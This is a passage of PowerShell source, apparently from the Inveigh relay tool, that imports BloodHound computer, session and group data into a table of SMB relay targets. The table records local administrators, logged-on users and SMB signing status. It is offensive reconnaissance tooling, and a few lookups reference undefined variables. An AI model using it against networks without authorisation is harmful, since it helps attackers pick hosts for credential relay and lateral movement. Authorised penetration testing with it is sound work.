        if($AdministratorGroups -and $AdministratorGroups -isnot [Array]){$AdministratorGroups = @($AdministratorGroups)}
        if($Privileged -and $Privileged -isnot [Array]){$Privileged = @($Privileged)}
        if($Shares -and $Shares -isnot [Array]){$Shares = @($Shares)}
        if($NetSessions -and $NetSessions -isnot [Array]){$NetSessions = @($NetSessions)}
        if($NetSessionsMapped -and $NetSessionsMapped -isnot [Array]){$NetSessionsMapped = @($NetSessionsMapped)}
        if($LocalUsers -and $LocalUsers -isnot [Array]){$LocalUsers = @($LocalUsers)}

        $relay_object = New-Object PSObject
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Index" $inveigh.enumerate.Count
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IP" $IP
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Hostname" $Hostname
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "DNS Domain" $DNSDomain
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "netBIOS Domain" $netBIOSDomain
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Sessions" $Sessions
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Users" $AdministratorUsers
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Administrator Groups" $AdministratorGroups
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Privileged" $Privileged
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Shares" $Shares
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions" $NetSessions
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "NetSessions Mapped" $NetSessionsMapped
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Local Users" $LocalUsers
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB2.1" $SMB2
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Signing" $Signing
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "SMB Server" $SMBServer
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "DNS Record" $DNSRecord
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "IPv6 Only" $IPv6Only
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Targeted" $Targeted
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Enumerate" $Enumerate
        Add-Member -InputObject $relay_object -MemberType NoteProperty -Name "Execute" $Execute
        
        return $relay_object
    }

    function Get-DNSEntry([String]$hostname)
    {

        try
        {
            $IP_list = [System.Net.Dns]::GetHostEntry($hostname)

            foreach($entry in $IP_list.AddressList)
            {

                if(!$entry.IsIPv6LinkLocal)
                {
                    $IP = $entry.IPAddressToString
                }

            }
                    
        }
        catch
        {
            $IP = $null
        }

        return $IP
    }

    # JSON parsing from http://wahlnetwork.com/2016/03/15/deserializing-large-json-payloads-powershell-objects/ 
    function Invoke-ParseItem($JSONItem) 
    {

        if($JSONItem.PSObject.TypeNames -match 'Array') 
        {
            return Invoke-ParseJsonArray($JSONItem)
        }
        elseif($JSONItem.PSObject.TypeNames -match 'Dictionary') 
        {
            return Invoke-ParseJsonObject([HashTable]$JSONItem)
        }
        else 
        {
            return $JSONItem
        }

    }

    function Invoke-ParseJsonObject($JSONObject) 
    {
        $result = New-Object -TypeName PSCustomObject

        foreach($key in $JSONObject.Keys) 
        {
            $item = $JSONObject[$key]

            if ($item) 
            {
                $parsed_item = Invoke-ParseItem $item
            }
            else 
            {
                $parsed_item = $null
            }

            $result | Add-Member -MemberType NoteProperty -Name $key -Value $parsed_item
        }

        return $result
    }

    function Invoke-ParseJSONArray($JSONArray) 
    {
        $result = @()
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0

        $JSONArray | ForEach-Object -Process {

            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
            {
                $percent_complete_calculation = [Math]::Truncate($i / $JSONArray.count * 100)

                if($percent_complete_calculation -le 100)
                {
                    Write-Progress -Activity "Parsing JSON" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
                }

                $stopwatch_progress.Reset()
                $stopwatch_progress.Start()
            }

            $i++
            $result += , (Invoke-ParseItem $_)}

        return $result
    }

    function Invoke-ParseJSONString($json) 
    {
        $config = $javaScriptSerializer.DeserializeObject($json)

        return Invoke-ParseJsonObject $config
    }

    [void][System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions")

    if($inveigh.enumerate.Count -eq 0)
    {
        $enumerate_empty = $true
    }

    if($Computers)
    {       
        $Computers = (Resolve-Path $Computers).Path
        $computers_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $computers_serializer.MaxJsonLength = 104857600
        $bloodhound_computers = [System.IO.File]::ReadAllText($Computers)
        $bloodhound_computers = $computers_serializer.DeserializeObject($bloodhound_computers)
        Write-Output "[*] Parsing BloodHound Computers JSON"
        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()
        $bloodhound_computers = Invoke-ParseItem $bloodhound_computers
        Write-Output "[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
        $stopwatch_parse.Reset()
        $stopwatch_parse.Start()
        Write-Output "[*] Importing computers to Inveigh"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0

        if(!$bloodhound_computers.Computers)
        {
            Write-Output "[!] JSON computers parse failed"
            throw
        }

        $bloodhound_computers.Computers | ForEach-Object {

            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
            {
                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_computers.Computers.Count * 100)

                if($percent_complete_calculation -le 100)
                {
                    Write-Progress -Activity "[*] Importing computers" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
                }

                $stopwatch_progress.Reset()
                $stopwatch_progress.Start()
            }

            $hostname = $_.Name
            [Array]$local_admin_users = $_.LocalAdmins | Where-Object {$_.Type -eq 'User'} | Select-Object -expand Name
            [Array]$local_admin_groups = $_.LocalAdmins | Where-Object {$_.Type -eq 'Group'} | Select-Object -expand Name

            if($DNS)
            {
                $IP = Get-DNSEntry $hostname

                if(!$IP)
                {
                    Write-Output "[-] DNS lookup for $Hostname failed"
                }

            }

            if(!$enumerate_empty)
            {

                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                {

                    if(($hostname -and $inveigh.enumerate[$i].Hostname -eq $hostname) -or ($IP -and $inveigh.enumerate[$i].IP -eq $IP))
                    {

                        if($inveigh.enumerate[$i].Hostname -ne $hostname -and $inveigh.enumerate[$i].IP -eq $IP)
                        {

                            for($j = 0;$j -lt $inveigh.enumerate.Count;$j++)
                            {

                                if($inveigh.enumerate[$j].IP -eq $target)
                                {
                                    $target_index = $j
                                    break
                                }

                            }

                            $inveigh.enumerate[$target_index].Hostname = $hostname
                        }
                        else
                        {

                            for($j = 0;$j -lt $inveigh.enumerate.Count;$j++)
                            {

                                if($inveigh.enumerate[$j].Hostname -eq $hostname)
                                {
                                    $target_index = $j
                                    break
                                }

                            }

                        }

                        $inveigh.enumerate[$target_index]."Administrator Users" = $local_admin_users
                        $inveigh.enumerate[$target_index]."Administrator Groups" = $local_admin_groups
                    }
                    else
                    {
                        $inveigh.enumerate.Add((New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups)) > $null
                    }

                }

            }
            else
            {
                $inveigh.enumerate.Add((New-RelayEnumObject -Hostname $_.Name -IP $IP -AdministratorUsers $local_admin_users -AdministratorGroups $local_admin_groups)) > $null
            }

            $IP = $null
            $hostname = $null
            $local_admin_users = $null
            $local_admin_groups = $null
            $target_index = $null
            $i++
        }

        Write-Output "[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
        $stopwatch_parse.Reset()
        Remove-Variable bloodhound_computers
    }

    if($Sessions)
    {
        $Sessions = (Resolve-Path $Sessions).Path
        $sessions_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $sessions_serializer.MaxJsonLength = 104857600
        $bloodhound_sessions = [System.IO.File]::ReadAllText($Sessions)
        $bloodhound_sessions = $sessions_serializer.DeserializeObject($bloodhound_sessions)
        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()
        Write-Output "[*] Parsing BloodHound Sessions JSON"
        $bloodhound_sessions = Invoke-ParseItem $bloodhound_sessions
        Write-Output "[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
        $stopwatch_parse.Reset()
        $stopwatch_parse.Start()
        Write-Output "[*] Importing sessions to Inveigh"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0

        if(!$bloodhound_sessions.Sessions)
        {
            Write-Output "[!] JSON sessions parse failed"
            throw
        }

        $bloodhound_sessions.Sessions | ForEach-Object {
            
            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
            {
                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_sessions.Sessions.Count * 100)

                if($percent_complete_calculation -le 100)
                {
                    Write-Progress -Activity "[*] Importing sessions" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
                }

                $stopwatch_progress.Reset()
                $stopwatch_progress.Start()
            }

            $hostname = $_.ComputerName

            if($hostname -as [IPAddress] -as [Bool])
            {
                $IP = $hostname
                $hostname = $null

                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                {

                    if($inveigh.enumerate[$i].IP -eq $target)
                    {
                        $target_index = $i
                        break
                    }

                }

            }
            else
            {
                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                {

                    if($inveigh.enumerate[$i].Hostname -eq $hostname)
                    {
                        $target_index = $i
                        break
                    }

                }

                if($DNS)
                {
                    $IP = Get-DNSEntry $hostname

                    if(!$IP)
                    {
                        Write-Output "[-] DNS lookup for $Hostname failed or IPv6 address"
                    }

                }

            }

            if(!$enumerate_empty -or $target_index -ge 0)
            {
                [Array]$session_list = $inveigh.enumerate[$target_index].Sessions

                if($session_list -notcontains $_.UserName)
                {
                    $session_list += $_.UserName
                    $inveigh.enumerate[$target_index].Sessions = $session_list
                }

            }
            else
            {   
                $inveigh.enumerate.Add($(New-RelayEnumObject -Hostname $hostname -IP $IP -Sessions $_.UserName)) > $null
            }

            $hostname = $null
            $IP = $null
            $session_list = $null
            $target_index = $null
            $i++
        }

        Write-Output "[+] Import completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
        $stopwatch_parse.Reset()
        Remove-Variable bloodhound_sessions
    }
    
    if($Groups)
    {
        $Groups = (Resolve-Path $Groups).Path
        $groups_serializer = New-Object -TypeName System.Web.Script.Serialization.JavaScriptSerializer
        $groups_serializer.MaxJsonLength = 104857600
        $bloodhound_groups = [System.IO.File]::ReadAllText($Groups)
        $bloodhound_groups = $groups_serializer.DeserializeObject($bloodhound_groups)
        $stopwatch_parse = [System.Diagnostics.Stopwatch]::StartNew()
        Write-Output "[*] Parsing BloodHound Groups JSON"
        $bloodhound_groups = Invoke-ParseItem $bloodhound_groups
        Write-Output "[+] Parsing completed in $([Math]::Truncate($stopwatch_parse.Elapsed.TotalSeconds)) seconds"
        $stopwatch_parse.Reset()
        $stopwatch_parse.Start()
        Write-Output "[*] Importing groups to Inveigh"
        $stopwatch_progress = [System.Diagnostics.Stopwatch]::StartNew()
        $i = 0

        if(!$bloodhound_groups.Groups)
        {
            Write-Output "[!] JSON groups parse failed"
            throw
        }
        
        $bloodhound_groups.Groups | ForEach-Object {

            if($stopwatch_progress.Elapsed.TotalMilliseconds -ge 500)
            {
                $percent_complete_calculation = [Math]::Truncate($i / $bloodhound_groups.Groups.Count * 100)

                if($percent_complete_calculation -le 100)
                {
                    Write-Progress -Activity "[*] Importing groups" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation -ErrorAction SilentlyContinue
                }

                $stopwatch_progress.Reset()
                $stopwatch_progress.Start()
            }

            [Array]$group_members = $_.Members | Select-Object -expand MemberName
            $inveigh.group_table.Add($_.Name,$group_members)
            $group_members = $null
            $i++
        }

        Write-Output "[+] Import completed in $([Math]::Truncate($stopwatch.Elapsed.TotalSeconds)) seconds"
    }

}

#endregion